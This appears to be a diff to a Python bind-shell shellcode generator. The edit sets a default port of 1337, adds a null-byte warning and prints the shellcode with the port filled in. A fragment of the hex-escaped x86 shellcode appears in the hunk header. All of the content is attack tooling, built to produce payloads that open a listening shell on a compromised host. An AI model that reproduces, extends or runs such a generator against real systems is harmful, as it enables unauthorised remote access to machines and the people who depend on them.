@@ -18,16 +18,19 @@ sc = ("\\x31\\xdb\\x53\\x6a\\x01\\x6a\\x0a\\x89\\xe1\\x6a\\x66\\x58\\x43\\xcd"
 if __name__ == '__main__':
     parser = ArgumentParser(description=("Dual Network Stack Bind Shell "
             "Generator"))
-    parser.add_argument('port', type=int, nargs='?',
-            help='The port to bind to')
+    parser.add_argument('port', type=int, nargs='?', default=1337,
+            help='The port to bind to (default 1337)')
     args = parser.parse_args()
 
     if args.port < 1 or args.port > 65535:
         print('Invalid port. Please select a port between 1 and 65535')
         sys.exit(1)
-    
+
     port = format(args.port, '04x')
     port = "\\x{b}\\x{a}".format(a=str(port[2:4]), b=str(port[0:2]))
+
+    if '\\x00' in port:
+        print('[!] Warning, port contains null value')
 
     print('Shellcode:')
     print(sc.format(port=port))
